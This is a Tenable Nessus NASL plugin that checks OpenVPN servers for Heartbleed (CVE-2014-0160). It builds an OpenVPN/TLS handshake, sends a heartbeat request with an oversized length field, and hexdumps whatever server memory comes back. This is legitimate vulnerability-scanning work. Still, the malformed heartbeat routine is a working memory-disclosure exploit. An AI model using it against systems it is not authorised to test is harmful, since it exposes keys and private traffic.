#TRUSTED 43dd0bb9d44a58876d9f61c4e9b752faca604eb380706ce6126bac1b43f0423b6e7c3601e350b374a9943825697aff65266ba7c68dbcfe2f79f16892ccbcf04e64db04b700ed62c813e9d33bd5b7af778103911fc2f1373b258eed37841df4c80030dbb4f013aecb402fd0516c4c84a7af856301f73bf2dd7dc421c07983f3610a26141e2ace1e112b5451f3d310555c6163d47959dd240870b579d2799fe5a34b18eeef84d9ceb9b8b7fb26f82ef6ef01418e19d482433e2a5846db2412875f98501f916dcabc4ff59b02481b97c9ad6c69455890d8f0cd0438f9201671ec559d24eca40de70528614a9d4dcfaa7c4d84d6016dcec107b0fc2642ae0b3511e8883b16b445e662e31369ebc740467e4deddd5ac57d380065f056d05549addec6af9e41972d82e271c5712ddbb1c5dec186da03d16843527eeceb8fc28676a2d092fe9fef4cf05975ff1a0d251d000f46e6b53162594e60d7252531862166a9610f7b5278378dcbf95a5d8b020f08f7169cb3ffcca76fddb3a5f127fae78a3479b5e8189d8e1fe8d223f6d70456206b2204199aee7935d1758358b35acaf4472baa01b7f923d35bc30bc8cf5ad597a81b20c83c72033e28edd7869508f524df4474c99babbab5330b45b7772a1b2e553cc1d19e534cf16036702fbc86a9206082b870e8a9911b221e8d4bc416b0c844dbbe4481714a7194a41587f9c8e760b5fe
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73491);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2015/10/07");

  script_cve_id("CVE-2014-0160");
  script_bugtraq_id(66690);
  script_osvdb_id(105465);
  script_xref(name:"CERT", value:"720951");
  script_xref(name:"EDB-ID", value:"32745");
  script_xref(name:"EDB-ID", value:"32764");
  script_xref(name:"EDB-ID", value:"32791");
  script_xref(name:"EDB-ID", value:"32998");

  script_name(english:"OpenVPN Heartbeat Information Disclosure (Heartbleed)");
  script_summary(english:"Checks if the OpenVPN server incorrectly handles a malformed TLS heartbeat message");

  script_set_attribute(attribute:"synopsis", value:
"The remote service is affected by an information disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"Based on its response to a TLS request with a specially crafted
heartbeat message (RFC 6520), the remote OpenVPN service appears to be
affected by an out-of-bounds read flaw.

Because the remote OpenVPN service does not employ the 'HMAC Firewall'
feature, this vulnerability can be exploited without authentication.

This vulnerability could allow an attacker to obtain secret keys,
cleartext VPN traffic, and other sensitive data.");
  script_set_attribute(attribute:"see_also", value:"http://heartbleed.com/");
  script_set_attribute(attribute:"see_also", value:"http://eprint.iacr.org/2014/140");
  script_set_attribute(attribute:"see_also", value:"https://www.openssl.org/news/vulnerabilities.html#2014-0160");
  script_set_attribute(attribute:"see_also", value:"https://www.openssl.org/news/secadv/20140407.txt");
  script_set_attribute(attribute:"see_also", value:"https://community.openvpn.net/openvpn/wiki/heartbleed");
  script_set_attribute(attribute:"solution", value:
"Upgrade the version of OpenSSL that OpenVPN is linked against to
1.0.1g or later. Alternatively, recompile OpenSSL with the
'-DOPENSSL_NO_HEARTBEATS' flag to disable the vulnerable
functionality. For Windows servers, upgrade to OpenVPN version
2.3.2-I004 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'OpenSSL Heartbeat (Heartbleed) Information Leak');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/04/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:openvpn:openvpn");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");
  script_family(english:"Misc.");

  script_dependencies("openvpn_detect.nasl");
  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("dump.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssl_funcs.inc");

#
# @remark RFC 6520
#

function heartbeat_ext()
{
  local_var mode;

  mode = _FCT_ANON_ARGS[0];
  if (isnull(mode))
    mode = 1; #  peer allowed to send requests

  return    mkword(15)  +  # extension type
            mkword(1)   +  # extension length
            mkbyte(mode);  # hearbeat mode
}

function heartbeat_req(payload, plen, pad)
{
  local_var req;

  if (isnull(plen))
    plen = strlen(payload);

  req = mkbyte(1) +       # HeartbeatMessageType: request
        mkword(plen) +    # payload length
        payload +         # payload
        pad;              # random padding

  return req;

}

#
# OpenVPN packet protocol code
#

# Lower 3 bits is the key id; higher 5 bits is the opcode
P_KEY_ID_MASK                  = 0x07;
P_OPCODE_SHIFT                 = 3;

# initial key from client, forget previous state
P_CONTROL_HARD_RESET_CLIENT_V1  = 1;

# initial key from server, forget previous state
P_CONTROL_HARD_RESET_SERVER_V1  = 2;

# new key, graceful transition from old to new key
P_CONTROL_SOFT_RESET_V1         = 3;

# control channel packet (usually TLS ciphertext)
P_CONTROL_V1                    = 4;

# acknowledgement for packets received
P_ACK_V1                        = 5;

# data channel packet
P_DATA_V1                       = 6;

# indicates key_method >= 2
# initial key from client, forget previous state
P_CONTROL_HARD_RESET_CLIENT_V2  = 7;

# initial key from server, forget previous state
P_CONTROL_HARD_RESET_SERVER_V2  = 8;

# define the range of legal opcodes
P_FIRST_OPCODE                  = 1;
P_LAST_OPCODE                   = 8;

global_var _ovpn, _tls;

function _randbytes()
{
  local_var i, len, out;

  len =_FCT_ANON_ARGS[0];

  out = NULL;
  for(i = 0; i < len; i++)
    out += raw_string(rand() % 256);

  return out;
}

function _bound_check()
{
  local_var b, p, l;

  b = _FCT_ANON_ARGS[0];
  p = _FCT_ANON_ARGS[1];
  l = _FCT_ANON_ARGS[2];

  if (p + l <= strlen(b)) return TRUE;
  return FALSE;
}

function ovpn_init(port, timeout, proto)
{
  _ovpn['port'] = port;
  _ovpn['clt_sid']  = _randbytes(8);
  _ovpn['srv_sid'] = NULL;
  _ovpn['pkt_id']     = 0;  # our pkt_id
  _ovpn['ack']        = make_list(); # Received packets to be ACKed
  _ovpn['proto']      = tolower(proto);

  if (isnull(timeout)) timeout = 5;
  _ovpn['timeout']    = timeout;

}

function ovpn_set_error()
{
  local_var err, ret;

  err = _FCT_ANON_ARGS[0];
  ret = _FCT_ANON_ARGS[1];

  _ovpn['errmsg'] = err;

  return ret;
}

function ovpn_get_last_error()
{
  return _ovpn['errmsg'];
}

function ovpn_get_port()
{
  return _ovpn['port'];
}

function ovpn_open_sock()
{
  local_var port, sock;

  port = ovpn_get_port();
  if (! port)
    return ovpn_set_error('No OpenVPN port specified.', FALSE);

  if (_ovpn['proto'] == 'udp')
    sock = open_sock_udp(port);
  else
    sock = open_sock_tcp(port);

  if (sock)
  {
    _ovpn['sock'] = sock;
    return TRUE;
  }
  else return ovpn_set_error('Failed to open socket on port '+port, FALSE);
}

function ovpn_close()
{
  if (_ovpn['sock']) close(_ovpn['sock']);
}

function ovpn_read()
{
  local_var data, sock, timeout, len;

  sock = _ovpn['sock'];
  if (! sock)
    return ovpn_set_error('Socket not open.', NULL);

  timeout = _ovpn['timeout'];

  len = 4096;
  if (_ovpn['proto'] == 'tcp')
    len = getword(blob:recv(socket:sock, min:2, length:2, timeout:timeout), pos:0);

  data = recv(socket:sock, min:len, length:len, timeout:timeout);

  if (isnull(data))
    return ovpn_set_error('Failed to read data from transport layer.', NULL);

  return data;
}

function ovpn_write(data)
{
  local_var sock;

  sock = _ovpn['sock'];
  if (! sock)
    return ovpn_set_error('Socket not open.', NULL);

  if (_ovpn['proto'] == 'tcp')
    data = mkword(strlen(data)) + data;

  send(socket:sock, data:data);
}

function ovpn_rel_read(len)
{
  local_var ack, ack_list, data, opcode, pkt, ret, indata;

  indata = NULL;
  data = NULL;
  while(TRUE)
  {
    # Requested data in buf
    if (strlen(indata) >= len)
    {
      data = substr(indata, 0 , len -1);
      indata -= data;

      return data;
    }

    # Read packet from network
    pkt = ovpn_read();
    if (isnull(pkt)) break;

    # Parse packet
    ret = ovpn_parse_pkt(pkt:pkt);
    if (isnull(ret)) break;

    # Get ACK record
    ack_list = ret['ack-list'];
    foreach ack (ack_list)
    {
      # sent pkt ACKed
      if (ack == _ovpn['pkt_id'])
        _ovpn['pkt_id']++;
    }

    opcode = ret['opcode'];

    if (opcode == P_CONTROL_V1)
    {
      indata += ret['data'];
    }

    if (!isnull(ret['pkt_id']))
    {
      pkt = ovpn_mk_pkt(opcode:P_ACK_V1, ack_list:make_list(ret['pkt_id']));
      ovpn_write(data:pkt);
    }
  }

  return indata;

}

function ovpn_parse_pkt(pkt)
{
  local_var ack, i, list, n, opcode, plen, pos, ret;

  plen = strlen(pkt);

  # len check
  if (plen < 10)
    return ovpn_set_error('Packet too short.', NULL);

  opcode = ord(pkt[0]) >> P_OPCODE_SHIFT;

  ret['opcode'] = opcode;
  ret['key_id'] = ord(pkt[0]) & P_KEY_ID_MASK;

  # Send session id
  ret['srv_sid'] = substr(pkt, 1, 8);

  #
  # Skip HMAC and pkt_id for replay protection as we don't use --tls-auth
  #

  #
  # Process ack record
  #
  ack = NULL;
  # Number of acknowledgements
  n = ord(pkt[9]);

  pos = 10;
  if (n)
  {
    if ( _bound_check(pkt, pos, n * 4 + 8))
    {
      # Array of pkt-ids in the ack
      list = NULL;
      for (i = 0; i < n ; i++)
      {
        list[i] = getdword(blob:pkt, pos:pos);
        pos += 4;
      }

      # Client session id
      ret['clt_sid'] = substr(pkt, pos, pos + 7);
      pos += 8;
    }
    else return ovpn_set_error('ACK record not found in packet.', NULL);
  }

  ret['ack-list'] = list;

  # We only deal with:
  #   P_CONTROL_HARD_RESET_SERVER_V2
  #   P_CONTROL_V1
  #   P_ACK_V1

  if (opcode == P_CONTROL_HARD_RESET_SERVER_V2)
  {
    # seqnum of the server
    ret['pkt_id'] = getdword(blob:pkt, pos:pos);
    if (isnull(ret['pkt_id']))
      return ovpn_set_error('Failed to get message packet-id in P_CONTROL_HARD_RESET_SERVER_V1', NULL);

    # Store server session id
    _ovpn['srv_sid'] = ret['srv_sid'];
  }
  else if (opcode == P_CONTROL_V1)
  {
    # seqnum of the server
    ret['pkt_id'] = getdword(blob:pkt, pos:pos);
    if (isnull(ret['pkt_id']))
      return ovpn_set_error('Failed to get message packet-id in P_CONTROL_V1', NULL);
    pos += 4;

    # TLS payload
    if (pos < plen)
    {
      ret['data'] = substr(pkt, pos);
    }
    else return ovpn_set_error('Failed to get TLS data in P_CONTROL_V1', NULL);
  }
  else if (opcode == P_ACK_V1)
  {
    # No addditional data in P_ACK_V1
  }

  return ret;

}

# Create an OpenVPN packet
function ovpn_mk_pkt(opcode, ack_list, data)
{
  local_var ack, ack_rec, clt_sid, n, pkt, pkt_id, srv_sid;

  clt_sid   = _ovpn['clt_sid'];
  srv_sid   = _ovpn['srv_sid'];
  pkt_id    = _ovpn['pkt_id'];

  pkt = mkbyte(opcode << P_OPCODE_SHIFT) +
        clt_sid;

  # Append ack record
  n = 0;
  ack_rec = NULL;
  foreach ack (ack_list)
  {
    ack_rec += mkdword(ack);
    n++;
  }
  ack_rec = mkbyte(n) + ack_rec;
  pkt +=  ack_rec;

  # Append remote session id associated with the ack record
  if (n) pkt += srv_sid;

  # We only send:
  #   P_CONTROL_HARD_RESET_CLIENT_V2
  #   P_CONTROL_V1
  #   P_ACK_V1
  if (opcode == P_CONTROL_HARD_RESET_CLIENT_V2)
  {
    pkt += mkdword(pkt_id);
  }
  else if (opcode == P_CONTROL_V1)
  {
    pkt += mkdword(pkt_id);

    pkt += data;
  }
  else if (opcode == P_ACK_V1)
  {
    # No addditional data in P_ACK_V1
  }

  return pkt;
}

#
# Main
#

# OpenVPN can listen on UDP or TCP. The same daemon can only listen on one or the other,
# but it is apparently common practice to run two daemons to do both UDP and TCP, and the
# OpenVPN authors have considered adding the ability to do both together.
# We cannot use get_service, because it will fork twice for the same port, giving the children
# no information about which of the two protocols they should be handling.
# Instead, we get a unique list of ports (UDP and TCP together) and fork for each of those ports,
# and then figure out the protocol afterwards, forking again if necessary.

ports = get_kb_list("openvpn/*/proto");
if (isnull(ports)) audit(AUDIT_NOT_DETECT, "OpenVPN");

# List of [ "openvpn/1194", "openvpn/5000", etc. ]
ports = list_uniq(keys(ports));

# Strip the text from each list item, leaving only the port number
for (i = 0; i < max_index(ports); ++i)
{
  m = eregmatch(string:ports[i], pattern:"^openvpn/([0-9]+)/proto$");
  ports[i] = int(m[1]);
}

# Fork for port, and then get the protocol (forking again if both TCP and UDP are used)
port = branch(ports, fork:TRUE);
proto = tolower(get_kb_item("openvpn/" + port + "/proto"));

# We use this later in audit messages - looks like "TCP port 1194"
proto_port = toupper(proto) + ' port ' + string(port);

if (tolower(get_kb_item("openvpn/" + port + "/" + proto + "/mode")) != "tls")
  exit(0, "The OpenVPN service on " + proto_port + " is not running in TLS mode");

if (proto == "udp")
{
  if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");
}
else
{
  if (!get_tcp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "TCP");
}

ovpn_init(port:port, proto:proto);

if (!ovpn_open_sock()) exit(1, ovpn_get_last_error());

# Tell the server we want to start a new session with it
pkt = ovpn_mk_pkt(opcode:P_CONTROL_HARD_RESET_CLIENT_V2);
ovpn_write(data:pkt);

pkt = ovpn_read();
if (isnull(pkt))
  exit(1, "Did not receive a response from the OpenVPN server on " + proto_port + ". " +
          "The 'HMAC Firewall' feature may be enabled.");

parsed = ovpn_parse_pkt(pkt:pkt);
if (isnull(parsed)) exit(1, ovpn_get_last_error());

# Make sure the server understands what we want to do
if (parsed['opcode'] != P_CONTROL_HARD_RESET_SERVER_V2)
  exit(1, 'Did not receive the expected P_CONTROL_HARD_RESET_SERVER_V2 from the OpenVPN server on ' + proto_port);

# OpenVPN uses P_ACK_V1 packets when it is simply ACKing, but
# otherwise sends the next message it means to send and bundles
# one or more ACKs with it.
# Here, we handle the ACK from the received P_CONTROL_HARD_RESET_SERVER_V2
ack_list = parsed['ack-list'];
foreach ack (ack_list)
{
  if (ack == _ovpn['pkt_id'])
  {
    _ovpn['pkt_id']++;
    break;
  }
}

# If we never received an ACK, as mentioned above, we shouldn't proceed.
if (_ovpn['pkt_id'] != 1)
  exit(1, 'P_CONTROL_HARD_RESET_CLIENT_V2 not ACKed.');

# ACK the P_CONTROL_HARD_RESET_SERVER_V2 we received from the server
pkt = ovpn_mk_pkt(opcode:P_ACK_V1, ack_list:make_list(parsed['pkt_id']));
ovpn_write(data:pkt);

# We use TLS 1.2 to accomodate all TLS versions configured
# on the server (i.e., --tls-version-min).
#
# OpenVPN server that doesn't support 1.2 will
# downgrade to a lower version. We capture the lower version
# in ServerHello, and send the heartbleed attack using that
# lower TLS version.
version = TLS_12;

# OpenVPN supported TLS ciphers, output of --show-tls
cipherspec = raw_string(
0xc0,0x30, # TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
0xc0,0x2c, # TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
0xc0,0x28, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
0xc0,0x24, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
0xc0,0x14, # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
0xc0,0x0a, # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
0x00,0xa3, # TLS_DHE_DSS_WITH_AES_256_GCM_SHA384
0x00,0x9f, # TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
0x00,0x6b, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
0x00,0x6a, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA256
0x00,0x39, # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
0x00,0x38, # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
0x00,0x88, # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
0x00,0x87, # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
0xc0,0x32, # TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
0xc0,0x2e, # TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
0xc0,0x2a, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
0xc0,0x26, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
0xc0,0x0f, # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
0xc0,0x05, # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
0x00,0x9d, # TLS_RSA_WITH_AES_256_GCM_SHA384
0x00,0x3d, # TLS_RSA_WITH_AES_256_CBC_SHA256
0x00,0x35, # TLS_RSA_WITH_AES_256_CBC_SHA
0x00,0x84, # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
0x00,0x8d, # TLS_PSK_WITH_AES_256_CBC_SHA
0xc0,0x12, # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
0xc0,0x08, # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
0x00,0x16, # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
0x00,0x13, # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
0xc0,0x0d, # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
0xc0,0x03, # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
0x00,0x0a, # TLS_RSA_WITH_3DES_EDE_CBC_SHA
0x00,0x8b, # TLS_PSK_WITH_3DES_EDE_CBC_SHA
0x00,0x1f, # TLS_KRB5_WITH_3DES_EDE_CBC_SHA, KRB5-DES-CBC3-SHA (OpenSSL name)
0x00,0x23, # TLS_KRB5_WITH_3DES_EDE_CBC_MD5, KRB5-DES-CBC3-MD5 (OpenSSL name)
0xc0,0x2f, # TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
0xc0,0x2b, # TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
0xc0,0x27, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
0xc0,0x23, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
0xc0,0x13, # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
0xc0,0x09, # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
0x00,0xa2, # TLS_DHE_DSS_WITH_AES_128_GCM_SHA256
0x00,0x9e, # TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
0x00,0x67, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
0x00,0x40, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA256
0x00,0x33, # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
0x00,0x32, # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
0x00,0x9a, # TLS_DHE_RSA_WITH_SEED_CBC_SHA
0x00,0x99, # TLS_DHE_DSS_WITH_SEED_CBC_SHA
0x00,0x45, # TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA
0x00,0x44, # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
0xc0,0x31, # TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
0xc0,0x2d, # TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
0xc0,0x29, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
0xc0,0x25, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
0xc0,0x0e, # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
0xc0,0x04, # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
0x00,0x9c, # TLS_RSA_WITH_AES_128_GCM_SHA256
0x00,0x3c, # TLS_RSA_WITH_AES_128_CBC_SHA256
0x00,0x2f, # TLS_RSA_WITH_AES_128_CBC_SHA
0x00,0x96, # TLS_RSA_WITH_SEED_CBC_SHA
0x00,0x41, # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
0x00,0x07, # TLS_RSA_WITH_IDEA_CBC_SHA, IDEA-CBC-SHA (OpenSSL name)
0x00,0x8c, # TLS_PSK_WITH_AES_128_CBC_SHA
0x00,0x21, # TLS_KRB5_WITH_IDEA_CBC_SHA, KRB5-IDEA-CBC-SHA (OpenSSL name)
0x00,0x25, # TLS_KRB5_WITH_IDEA_CBC_MD5, KRB5-IDEA-CBC-MD5 (OpenSSL name)
0xc0,0x11, # TLS_ECDHE_RSA_WITH_RC4_128_SHA
0xc0,0x07, # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
0xc0,0x0c, # TLS_ECDH_RSA_WITH_RC4_128_SHA
0xc0,0x02, # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
0x00,0x05, # TLS_RSA_WITH_RC4_128_SHA
0x00,0x04, # TLS_RSA_WITH_RC4_128_MD5
0x00,0x8a, # TLS_PSK_WITH_RC4_128_SHA
0x00,0x20, # TLS_KRB5_WITH_RC4_128_SHA, KRB5-RC4-SHA (OpenSSL name)
0x00,0x24, # TLS_KRB5_WITH_RC4_128_MD5, KRB5-RC4-MD5 (OpenSSL name)
0x00,0x15, # TLS_DHE_RSA_WITH_DES_CBC_SHA
0x00,0x12, # TLS_DHE_DSS_WITH_DES_CBC_SHA
0x00,0x09, # TLS_RSA_WITH_DES_CBC_SHA
0x00,0x1e, # TLS_KRB5_WITH_DES_CBC_SHA, KRB5-DES-CBC-SHA (OpenSSL name)
0x00,0x22, # TLS_KRB5_WITH_DES_CBC_MD5, KRB5-DES-CBC-MD5 (OpenSSL name)
0x00,0x0e, # TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA
0x00,0x0b, # TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA
0x00,0x08, # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
0x00,0x06, # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
0x00,0x27, # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA, EXP-KRB5-RC2-CBC-SHA (OpenSSL name)
0x00,0x26, # TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA, EXP-KRB5-DES-CBC-SHA (OpenSSL name)
0x00,0x2a, # TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5, EXP-KRB5-RC2-CBC-MD5 (OpenSSL name)
0x00,0x29, # TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5, EXP-KRB5-DES-CBC-MD5 (OpenSSL name)
0x00,0x03, # TLS_RSA_EXPORT_WITH_RC4_40_MD5
0x00,0x28, # TLS_KRB5_EXPORT_WITH_RC4_40_SHA, EXP-KRB5-RC4-SHA (OpenSSL name)
0x00,0x2b  # TLS_KRB5_EXPORT_WITH_RC4_40_MD5, EXP-KRB5-RC4-MD5 (OpenSSL name)
);

# Make our ClientHello, offering support for heartbeat.
# Also send EC extensions because we offer EC based ciphers.
ver  = mkword(version);
exts = heartbeat_ext() + tls_ext_ec() + tls_ext_ec_pt_fmt();
exts_len = mkword(strlen(exts));
chello = client_hello(v2hello:FALSE, version:ver,
                      cipherspec : cipherspec,
                      extensions:exts,extensionslen:exts_len);

# Wrap it up into an OpenVPN packet
chello = ovpn_mk_pkt(opcode:P_CONTROL_V1, data:chello);
ovpn_write(data:chello);

# Receive up to 1MB from the server - should contain ServerHello, key exchange, and ServerHelloDone
data = ovpn_rel_read(len:1024 * 1024);

hello_done = FALSE;
while (!hello_done)
{
  if (isnull(data)) audit(AUDIT_RESP_NOT, port, 'a TLS ClientHello message', proto);

  # ServerHello: Extract the random data for computation of keys.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO
  );

  if (!isnull(rec))
  {
    # Look for heartbeat mode in ServerHello
    heartbeat_mode = rec['extension_heartbeat_mode'];

    # Make sure we use an SSL version supported by the server
    if(rec['version'] != version && rec['version'] >= 0x0301 && rec['version'] <= 0x0303)
      version = rec['version'];
  }

  # Server Hello Done.
  rec = ssl_find(
    blob:data,
    'content_type', SSL3_CONTENT_TYPE_HANDSHAKE,
    'handshake_type', SSL3_HANDSHAKE_TYPE_SERVER_HELLO_DONE
  );

  if (!isnull(rec))
  {
    hello_done = TRUE;
    break;
  }
}
if (! hello_done)
  exit(1, 'ServerHelloDone not received from OpenVPN server listening on ' + proto_port +'.');

# Check if TLS server supports heartbeat extension
if (isnull(heartbeat_mode))
  exit(0, 'The OpenVPN service listening on ' + proto_port + ' does not appear to support heartbeat extension.');

# Check if TLS server willing to accept heartbeat requests
if (heartbeat_mode != 1)
  exit(0, 'The OpenVPN service listening on ' + proto_port + ' does not appear to accept heartbeat requests.');


# Send a malformed heartbeat request
payload = crap(data:'A', length:16);
pad = crap(data:'P',length:16);
hb_req = heartbeat_req(payload:payload, plen:strlen(payload)+ strlen(pad)+4096, pad:pad);
rec = tls_mk_record(type:24, data:hb_req, version:version);
pkt = ovpn_mk_pkt(opcode:P_CONTROL_V1, data:rec);
ovpn_write(data:pkt);

# Receive up to 1MB from the server
res = ovpn_rel_read(len:1024 * 1024);

# Close the socket
ovpn_close();

# Patched TLS server does not respond
if (isnull(res))
  exit(0, 'The OpenVPN install listening on ' + proto_port + ' is not affected.');

# Got a response
# Look for hearbeat response
data = ord(res[5]);
if (data != 2)
  exit(1, 'The service listening on ' + proto_port + ' did not return a heartbeat response.');

if (ord(res[0]) == 0x15)
  exit(0, 'The service listening on ' + proto_port + ' returned an alert, which suggests the remote OpenVPN service is not affected.');

# TLS server overread past payload into the padding field
if ((payload + pad) >!< res)
  audit(AUDIT_RESP_BAD, port, "invalid TLS heartbeat", toupper(proto));

report = NULL;
if (report_verbosity > 0)
{
  hb_res = substr(res, 8);
  hb_res -= (payload + pad);
  report = 'Nessus was able to read the following memory from the remote OpenVPN service :\n\n' + hexdump(ddata:hb_res);
}
security_hole(port:port, extra:report, proto:proto);
